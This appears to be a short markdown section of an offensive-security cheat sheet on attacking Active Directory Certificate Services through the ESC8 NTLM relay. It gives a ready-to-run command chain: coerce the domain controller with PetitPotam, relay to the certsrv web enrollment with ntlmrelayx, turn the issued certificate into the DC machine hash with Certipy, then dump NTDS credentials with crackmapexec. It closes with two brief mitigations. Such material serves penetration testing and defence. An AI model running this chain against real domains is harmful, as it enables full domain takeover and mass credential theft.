# Attacking Active Directory

- [Active Directory Attacks](#active-directory-attacks)
    - [AD CS Attacks](#adcs-attacks)
        - [ESC8](#esc8)


## AD CS Attacks

**Read this about AD CS Attacks:** [Certified Pre-Owned by Will Schroeder and Lee Christensen](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

### ESC8 - AD CS Relay Attack

* Impacket ntlmrelayx & PetitPotam

    **Requirements:**
    - CA Web Enrollment interface reachable via http
    - Extended Protection for Authentication disabled

    * Required Tool [PetitPotam](https://github.com/topotam/PetitPotam)
    * Required Tool [Certipy](https://github.com/ly4k/Certipy)

    ```powershell
    # Start the NTLM relay and configure it to forward the DC's NTLM Credentials to the AD CS Web Enrollment page
    /usr/bin/impacket-ntlmrelay -t http://<ad-cs-server>/certsrv --adcs --template "DomainController" -smb2support
    # Trigger the Domain Controller to send NTLM Credentials to our relay
    python3 PetitPotam.py -u 'user' -p 'password' <attacker-relay> <dc>
    # Decode the Base64 certificate and pipe it to a pfx 
    echo "<base64 certificate>" | base64 -d > dc-machine-account.pfx
    # Request a TGT with the pfx certificate and get the DC-Machine NTLM Hash
    certipy auth -pfx dc-machine-account.pfx
    # Ready to own the Domain
    crackmapexec smb <dc> -u <dc-machine-account$> -H <Hash> --ntds
    ```

    **Mitigations:**
    - Use SSL only (disable http) in IIS Manager for certsrv
    - Enforce Extended Protection for Authentication [MS Blog Post](https://msrc.microsoft.com/blog/2009/12/extended-protection-for-authentication/)